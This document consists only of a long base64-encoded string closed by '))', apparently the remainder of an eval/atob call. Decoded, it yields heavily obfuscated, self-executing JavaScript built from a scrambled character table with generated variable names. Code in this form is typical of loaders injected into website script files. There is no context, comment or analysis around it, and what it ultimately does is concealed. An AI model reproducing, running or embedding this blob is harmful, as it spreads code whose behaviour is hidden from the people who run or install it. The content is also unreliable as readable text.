mVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
